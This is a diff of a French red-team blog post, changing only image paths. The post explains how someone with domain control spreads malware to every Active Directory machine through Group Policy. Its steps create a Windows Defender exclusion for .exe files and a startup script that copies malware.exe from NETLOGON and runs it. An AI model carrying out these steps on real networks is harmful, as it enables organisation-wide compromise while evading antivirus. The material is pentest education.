@@ -6,7 +6,7 @@ description: "Cet article décrit comment compromettre un poste de l'Active Dire
 lang: fr_FR
 category: redteam,malware,active directory,gpo
 ---
-![Compromission d'un poste de l'Active Directory via une GPO](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/illustration.PNG)
+![Compromission d'un poste de l'Active Directory via une GPO](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/illustration.PNG)
 
 L'objectif principal d'Active Directory est de fournir des services centralisés d'identification et d'authentification à un réseau d'ordinateurs utilisant le système Windows, macOS ou encore Linux. Il permet également l'attribution et **l'application de stratégies de groupes** ainsi que **l'installation de mises à jour critiques** par les administrateurs.
 L'Active Directory est donc le nerf de la guerre du pentester Red Team. En cas de compromissions de ce dernier, la partie est gagnée. L'attaquant peut alors rebondir sur les différents postes du domaine compromis.
@@ -18,14 +18,14 @@ L'idée est ici de déployer un malware sur tous les systèmes de l'Active Direc
 ### Création de la GPO malveillante
 La première étape est de créer la GPO malveillante que je nommerai...*Installation Malware* qui est effective sur le domaine *mondomaine.local* et s'applique à **tous les utilisateurs authentifiés** :
 
-[![Création de la GPO malveillante](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo.PNG)
+[![Création de la GPO malveillante](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo.PNG)](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo.PNG)
 
 ### Exclusion de la détection du malware
 Une des politiques de sécurité appliquée sera d'exclure la détection des fichiers ayant pour extension *.exe*.
 
 Il faut donc dans la partie *Composants Windows* -> *Antivirus Windows Defender* -> *Exclusions* -> *Exclusion d'extensions*, créer une règle d'exclusion sur le *.exe*.
 
-[![Exclusion de la détection des fichiers .exe](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_exclusion.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_exclusion.PNG)
+[![Exclusion de la détection des fichiers .exe](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_exclusion.PNG)](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_exclusion.PNG)
 
 Tout exécutable **normalement détecté par Windows Defender** pourra ainsi être **exécuté sans être bloqué** par Windows Defender.
 
@@ -41,17 +41,17 @@ copy \\mondomaine.local\NETLOGON\\malware.exe C:\Windows\malware.exe && C:\Windo
 ```
 Le script doit également être placé dans le partage administratif :
 
-[![Placement des logiciels malveillants dans SYSVOL](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/sysvol.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/sysvol.PNG)
+[![Placement des logiciels malveillants dans SYSVOL](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/sysvol.PNG)](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/sysvol.PNG)
 
 ### Création de la GPO qui exécutera le script
 
 La GPO qui exécutera le script au démarrage de l'ordinateur doit maintenant être créée. Pour ce faire, la catégorie *Paramètre Windows* -> *Scripts (démarrage/arrêt)* va être utilisée. Il faut alors spécifier le script en question qui sera démarré :
 
-[![Création de la GPO qui exécute le script de téléchargement du malware](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo_execution_malware.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo_execution_malware.PNG)
+[![Création de la GPO qui exécute le script de téléchargement du malware](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo_execution_malware.PNG)](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/creation_gpo_execution_malware.PNG)
 
 Une fois le redémarrage de l'ordinateur, le script est alors exécuté qui lui même téléchargera le logiciel malveillant et l'exécutera. Du côté de l'attaquant, la victime est alors visible :
 
-[![Liste des PC compromis](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/liste_pc_compromis.PNG)](/assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/liste_pc_compromis.PNG)
+[![Liste des PC compromis](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/liste_pc_compromis.PNG)](assets/images/2021-03-19-Une-GPO-pour-les-gouverner-tous/liste_pc_compromis.PNG)
 
 ## Conclusion
 Cet exemple d'exploitation prouve que le contrôleur de domaine est vraiment une pièce maîtresse du réseau d'entreprise et qu'il doit être protégé au maximum. Il y a plein d'autres scénarii imaginables.
